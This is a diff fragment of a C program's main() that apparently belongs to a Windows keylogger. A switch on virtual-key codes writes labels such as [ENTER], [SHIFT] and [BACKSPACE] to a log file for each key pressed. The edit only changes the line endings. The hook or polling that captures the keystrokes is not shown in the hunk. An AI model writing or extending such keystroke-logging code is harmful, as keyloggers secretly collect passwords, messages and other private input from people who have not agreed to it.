@@ -32,55 +32,55 @@ int main() {
                     fclose(file);
                     break;
                     case VK_RETURN:
-                    fputs("\r\n[ENTER]\r\n",file);
+                    fputs("\n[ENTER]\n",file);
                     fclose(file);
                     break;
                     case VK_SHIFT:
-                    fputs("\r\n[SHIFT]\r\n", file);
+                    fputs("\n[SHIFT]\n", file);
                     fclose(file);
                     break;
                     case VK_CONTROL:
-                    fputs("\r\n[CTRL]\r\n",file);
+                    fputs("\n[CTRL]\n",file);
                     fclose(file);
                     break;
                     case VK_BACK:
-                    fputs("\r\n[BACKSPACE]\r\n",file);
+                    fputs("\n[BACKSPACE]\n",file);
                     fclose(file);
                     break;
                     case VK_TAB:
-                    fputs("\r\n[TAB]\r\n",file);
+                    fputs("\n[TAB]\n",file);
                     fclose(file);
                     break;
                     case VK_DELETE:
-                    fputs("\r\n[DEL]\r\n",file);
+                    fputs("\n[DEL]\n",file);
                     fclose(file);
                     break;
                     case VK_OEM_1:
-                    fputs("\r\n[;:]\r\n",file);
+                    fputs("\n[;:]\n",file);
                     fclose(file);
                     break;
                     case VK_OEM_2:
-                    fputs("\r\n[/?]\r\n",file);
+                    fputs("\n[/?]\n",file);
                     fclose(file);
                     break;
                     case VK_OEM_3:
-                    fputs("\r\n[`~]\r\n",file);
+                    fputs("\n[`~]\n",file);
                     fclose(file);
                     break;
                     case VK_OEM_4:
-                    fputs("\r\n[ [{ ]\r\n",file);
+                    fputs("\n[ [{ ]\n",file);
                     fclose(file);
                     break;
                     case VK_OEM_5:
-                    fputs("\r\n[\\|]\r\n",file);
+                    fputs("\n[\\|]\n",file);
                     fclose(file);
                     break;
                     case VK_OEM_6:
-                    fputs("\r\n[ ]} ]\r\n",file);
+                    fputs("\n[ ]} ]\n",file);
                     fclose(file);
                     break;
                     case VK_OEM_7:
-                    fputs("\r\n['\"]\r\n",file);
+                    fputs("\n['\"]\n",file);
                     fclose(file);
                     break;
                     case 187:
